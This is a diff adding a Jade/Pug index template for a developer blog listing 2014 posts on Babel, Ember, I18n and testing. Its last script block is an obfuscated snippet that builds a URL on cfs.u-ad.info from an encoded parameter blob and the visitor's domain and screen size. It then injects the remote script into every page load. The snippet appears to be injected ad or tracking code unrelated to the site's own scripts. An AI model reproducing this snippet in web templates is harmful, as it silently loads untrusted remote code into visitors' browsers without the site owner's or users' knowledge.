@@ -1,0 +1,356 @@
+doctype html
+html
+	head
+		meta(charset='utf-8')
+		meta(content='IE=edge', http-equiv='X-UA-Compatible')
+		title Level up your development skills | Chris Ball
+		meta(content='width=device-width, initial-scale=1', name='viewport')
+		meta(content='Level up your development skills | Chris Ball', name='og:site_name')
+		meta(content='blog', name='og:type')
+		meta(name='description', content='Level up your development skills every week.')
+		//if lt IE 9
+			script(src='//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js')
+			script(src='//oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js')
+		link(href='//cloud.typography.com/6222872/746702/css/fonts.css', media='all', rel='stylesheet', type='text/css')
+		link(href='//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css', media='all', rel='stylesheet', type='text/css')
+		link(href='/stylesheets/application.css', media='all', rel='stylesheet', type='text/css')
+		link(href='/stylesheets/print.css', media='print', rel='stylesheet', type='text/css')
+	body.index
+		header.hidden-print
+			.container
+				.row
+					.col-md-12
+						.home
+							a(href='/')
+								span.title Level Up
+								span.name  by Chris Ball 
+						ul.nav.nav-pills
+							li
+								a(href='/about') About
+							li
+								a(href='/') Posts
+							li
+								a(href='/talks') Talks
+							li
+								a(href='/contact') Contact
+		.container
+			.row
+				#main.col-md-10.col-md-offset-1
+					article
+						.post-header
+							.inner
+								a(href='/bring-some-es6-awesome-with-esnext/')
+									img.img-responsive(src='http://cball.me.s3.amazonaws.com/es6-awesome.png')
+								.date
+									.month Dec
+									.day 22
+									.year 2014
+						.post-body
+							h2.title
+								a(href='/bring-some-es6-awesome-with-esnext/')
+									| Bring some ES6 Awesome with 
+									del esnext
+									|  Babel
+							.date.subtitle December 22, 2014
+							.by
+								a.author(target='_blank', href='http://twitter.com/cball_')
+									img(src='http://www.gravatar.com/avatar/6254dc2b7e4f26b2ab5d05c560834671.png')
+									.twitter
+										div
+											i.fa.fa-twitter
+											|  cball_
+							hr
+							p
+								strong Belated Update: 3/4/15
+							p
+								| esnext was replaced with 6to5, which was recently renamed to 
+								a(href='http://babeljs.io') Babel
+								| . The article below has been updated to reflect the changes.
+							hr
+							p
+								| ES6 is the next version of JavaScript. 
+								del esnext
+								|  Babel is a library that allows you to ES6 functions...
+							a.read-more-link(href='/bring-some-es6-awesome-with-esnext/') Continue reading »
+						hr
+					article
+						.post-header
+							.inner
+								a(href='/organize-your-ember-app-with-pods/')
+									img.img-responsive(src='http://cball.me.s3.amazonaws.com/pods.png')
+								.date
+									.month Nov
+									.day 17
+									.year 2014
+						.post-body
+							h2.title
+								a(href='/organize-your-ember-app-with-pods/') Organize Your Ember App with Pods
+							.date.subtitle November 17, 2014
+							.by
+								a.author(target='_blank', href='http://twitter.com/cball_')
+									img(src='http://www.gravatar.com/avatar/6254dc2b7e4f26b2ab5d05c560834671.png')
+									.twitter
+										div
+											i.fa.fa-twitter
+											|  cball_
+							hr
+							p
+								| You may have seen references to pods when reading up on Ember and ember-cli. What the heck are pods? Simply put, pods are a way of grouping files in your project by feature (ex: Task) rather than by type (ex: controllers). According to the ember-cli...
+							a.read-more-link(href='/organize-your-ember-app-with-pods/') Continue reading »
+						hr
+					article
+						.post-header
+							.inner
+								a(href='/i18n-in-practice/')
+									img.img-responsive(src='http://cball.me.s3.amazonaws.com/i18n2.jpg')
+								.date
+									.month Oct
+									.day 24
+									.year 2014
+						.post-body
+							h2.title
+								a(href='/i18n-in-practice/') I18n in Practice
+							.date.subtitle October 24, 2014
+							.by
+								a.author(target='_blank', href='http://twitter.com/cball_')
+									img(src='http://www.gravatar.com/avatar/6254dc2b7e4f26b2ab5d05c560834671.png')
+									.twitter
+										div
+											i.fa.fa-twitter
+											|  cball_
+							hr
+							p
+								| In 
+								a(href='/not-using-i18n-you-probably-should-be') part 1
+								|  of this series on using I18n, we looked at reasons to use I18n in your apps, even if you only need to support a single language.
+							p
+								| Now, let’s look at how to use I18n in that context using both 
+								a(href='#i18n-rails') Rails
+								|  and 
+								a(href='#i18n-ember') ember.js
+								| .
+							p
+								a(name='i18n-rails')
+							h4#i18n-example-in-rails I18n example in Rails
+							a.read-more-link(href='/i18n-in-practice/') Continue reading »
+						hr
+					article
+						.post-header
+							.inner
+								a(href='/not-using-i18n-you-probably-should-be/')
+									img.img-responsive(src='http://cball.me.s3.amazonaws.com/i18n.jpg')
+								.date
+									.month Oct
+									.day 24
+									.year 2014
+						.post-body
+							h2.title
+								a(href='/not-using-i18n-you-probably-should-be/') Not using I18n? You probably should be.
+							.date.subtitle October 24, 2014
+							.by
+								a.author(target='_blank', href='http://twitter.com/cball_')
+									img(src='http://www.gravatar.com/avatar/6254dc2b7e4f26b2ab5d05c560834671.png')
+									.twitter
+										div
+											i.fa.fa-twitter
+											|  cball_
+							hr
+							p
+								| I18n is an acronym for internationalization. It is a part of most frameworks, and is used in applications to translate words or phrases to other languages. Instead of writing the phrase “My favorite songs”, you make a call to the I18n library to fetch...
+							a.read-more-link(href='/not-using-i18n-you-probably-should-be/') Continue reading »
+						hr
+					article
+						.post-header
+							.inner
+								a(href='/realtime-app-version-notices/')
+									img.img-responsive(src='http://cball.me.s3.amazonaws.com/realtime-app-version/realtime-app-version-notices.jpg')
+								.date
+									.month Sep
+									.day 24
+									.year 2014
+						.post-body
+							h2.title
+								a(href='/realtime-app-version-notices/') Realtime App Version Notices with socket.io and Redis
+							.date.subtitle September 24, 2014
+							.by
+								a.author(target='_blank', href='http://twitter.com/cball_')
+									img(src='http://www.gravatar.com/avatar/6254dc2b7e4f26b2ab5d05c560834671.png')
+									.twitter
+										div
+											i.fa.fa-twitter
+											|  cball_
+							hr
+							p
+								| If you’ve been on a site powered by 
+								a(href='http://www.discourse.org/') Discourse
+								| , you may have seen the following notification:
+							p
+								img(alt='discourse update', src='http://cball.me.s3.amazonaws.com/discourse_update.png')
+							p How and why did they do this?
+							p
+								| One of the built-in benefits of rendering frontend templates server-side is that you are guaranteed users will be using the...
+							a.read-more-link(href='/realtime-app-version-notices/') Continue reading »
+						hr
+					article
+						.post-header
+							.inner
+								a(href='/help-i-have-no-tests/')
+									img.img-responsive(src='http://cball.me.s3.amazonaws.com/help-i-have-no-tests.jpg')
+								.date
+									.month Sep
+									.day 16
+									.year 2014
+						.post-body
+							h2.title
+								a(href='/help-i-have-no-tests/') Help I have no tests!
+							.date.subtitle September 16, 2014
+							.by
+								a.author(target='_blank', href='http://twitter.com/cball_')
+									img(src='http://www.gravatar.com/avatar/6254dc2b7e4f26b2ab5d05c560834671.png')
+									.twitter
+										div
+											i.fa.fa-twitter
+											|  cball_
+							hr
+							p
+								| There will come a point in your career as a developer that you run across one of two common scenarios.
+							ol
+								li
+									a(href='#no-tests') You come face-to-face with a project that has no tests (or very few)
+									| .
+								li
+									a(href='#incorrect-tests') You come face-to-face with a project that has incorrect tests
+									| .
+							p These two...
+							a.read-more-link(href='/help-i-have-no-tests/') Continue reading »
+						hr
+					article
+						.post-header
+							.inner
+								a(href='/understanding-loading-substates-in-ember/')
+									img.img-responsive(src='http://cball.me.s3.amazonaws.com/loading-substates/understanding-loading-substates.jpg')
+								.date
+									.month Sep
+									.day  5
+									.year 2014
+						.post-body
+							h2.title
+								a(href='/understanding-loading-substates-in-ember/') Understanding Loading Substates in Ember
+							.date.subtitle September  5, 2014
+							.by
+								a.author(target='_blank', href='http://twitter.com/cball_')
+									img(src='http://www.gravatar.com/avatar/6254dc2b7e4f26b2ab5d05c560834671.png')
+									.twitter
+										div
+											i.fa.fa-twitter
+											|  cball_
+							hr
+							p
+								| Ember applications (and client-side applications in general) respond quickly to user interaction. In a perfect world, the API powering your application also responds quickly, but unfortunately most of us don’t live in a perfect world.
+							p Ember has a...
+							a.read-more-link(href='/understanding-loading-substates-in-ember/') Continue reading »
+						hr
+					article
+						.post-header
+							.inner
+								a(href='/non-restful-api-calls-with-ember-data/')
+									img.img-responsive(src='http://cball.me.s3.amazonaws.com/ember-making-non-restful-api-calls.jpg')
+								.date
+									.month May
+									.day  2
+									.year 2014
+						.post-body
+							h2.title
+								a(href='/non-restful-api-calls-with-ember-data/') Non-RESTful API calls with Ember Data
+							.date.subtitle May  2, 2014
+							.by
+								a.author(target='_blank', href='http://twitter.com/cball_')
+									img(src='http://www.gravatar.com/avatar/6254dc2b7e4f26b2ab5d05c560834671.png')
+									.twitter
+										div
+											i.fa.fa-twitter
+											|  cball_
+							hr
+							p
+								| When developing an application using Ember and Ember Data, if the API you're using is a completely RESTful interface, things are very straightforward. Once you need to make a call that does not fit into standard REST conventions, such as 
+								strong task/:id/complete
+								|  as PUT request, you have a choice to make. Your first instinct might be to reach for Ember.$.ajax, but don't; especially if you're sending custom headers or using a namespace. 
+								a.read-more-link(href='/non-restful-api-calls-with-ember-data/') Continue reading »
+						hr
+					article
+						.post-header
+							.inner
+								a(href='/book-some-janitor-time/')
+									img.img-responsive(src='http://cball.me.s3.amazonaws.com/book_janitor_time.jpg')
+								.date
+									.month Apr
+									.day 23
+									.year 2014
+						.post-body
+							h2.title
+								a(href='/book-some-janitor-time/') Book Some Janitor Time
+							.date.subtitle April 23, 2014
+							.by
+								a.author(target='_blank', href='http://twitter.com/cball_')
+									img(src='http://www.gravatar.com/avatar/6254dc2b7e4f26b2ab5d05c560834671.png')
+									.twitter
+										div
+											i.fa.fa-twitter
+											|  cball_
+							hr
+							p
+								| If your team works in an office, you probably have a janitor that comes in to clean it. It might happen daily or weekly, but chances are that it happens. What if you applied that same mindset to your codebase?
+								a.read-more-link(href='/book-some-janitor-time/') Continue reading »
+						hr
+					article
+						.post-header
+							.inner
+								a(href='/one-way-to-be-insanely-productive-as-a-developer/')
+									img.img-responsive(src='http://cball.me.s3.amazonaws.com/one_way_to_be_productive.jpg')
+								.date
+									.month Apr
+									.day 14
+									.year 2014
+						.post-body
+							h2.title
+								a(href='/one-way-to-be-insanely-productive-as-a-developer/') One Way to be Insanely Productive as a Developer
+							.date.subtitle April 14, 2014
+							.by
+								a.author(target='_blank', href='http://twitter.com/cball_')
+									img(src='http://www.gravatar.com/avatar/6254dc2b7e4f26b2ab5d05c560834671.png')
+									.twitter
+										div
+											i.fa.fa-twitter
+											|  cball_
+							hr
+							p
+								| Most of us are easily distracted. It's very tempting to check email, browse your Twitter feed, or poke around on Reddit. Over time, I've found that you can still do all of those things, you just have to timebox them. The biggest productivity boost I've found actually has nothing to do with programming.
+								a.read-more-link(href='/one-way-to-be-insanely-productive-as-a-developer/') Continue reading »
+						hr
+					#article-nav
+						.pull-left
+						.pull-right
+							a(href='/page/2/') Older »
+		footer
+			ul.list-unstyled.hidden-print
+				li
+					a(href='http://twitter.com/cball_')
+						| Built by 
+						i.fa.fa-twitter
+						|  cball_
+			.echobind.center
+				a(target='_blank', href='http://echobind.com')
+					img(src='/images/echobind.png')
+			p.centered All content ©2014 Chris Ball
+		script(src='//cdnjs.cloudflare.com/ajax/libs/jquery/1.10.2/jquery.min.js')
+		script(src='/javascripts/application.js', type='text/javascript')
+		script(type='text/javascript').
+			// google analytics
+			(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+			})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+			ga('create', 'UA-46757526-1', 'auto');
+			ga('send', 'pageview');
+		script(type='text/javascript').
+			if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlR83FWY4jB%2fHKKy1DXbjdyi1ywoI4bYS3uigFbSt8nmd2P6fKNCGBurWASePbMpGq2s%2f7YoYxZKbo5fXH7dwjhxEnz9lsPmjVd3Wk9wzKGpQbsbsApwxtRxstExfx1lPmGfabPBXPlLaZwKs%2f6MHjOBwaB3eYtRz9rRy95kKwtKP5dEWBDpRuck5bKKT5iaUzIbNisp4ybIfXDFiYkCFFu2pmakGaZctBZeV1c15YJtcQU97hH%2fQtS1P3KLj2bVRNgNAMzDYZGZe2t6TbnPbYclQcy07x9LIZ38la5HSkUviOqIAgLsOMQFLpon45hjNz8zpF7i%2fC90nXlgHPEU9XjW2fJccpm%2fAw8fdb8AzB0dk57FENUZGY%2fz4zE9ufQc24Ca61PJ4UsIebEyf%2fDonYMByqbUpB4RpJjbxvtHuS7OKtUvKX73BcZRjYqZCa%2fNViRulcVz3YcwB1cLK4Nxx1oOivbMnHKRtfIwDeTOjjRXHUoctXGPW4qYbOaYCU15HLpZwbgILnDbYFFMAYNaO39IcxuBwQzohrF" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
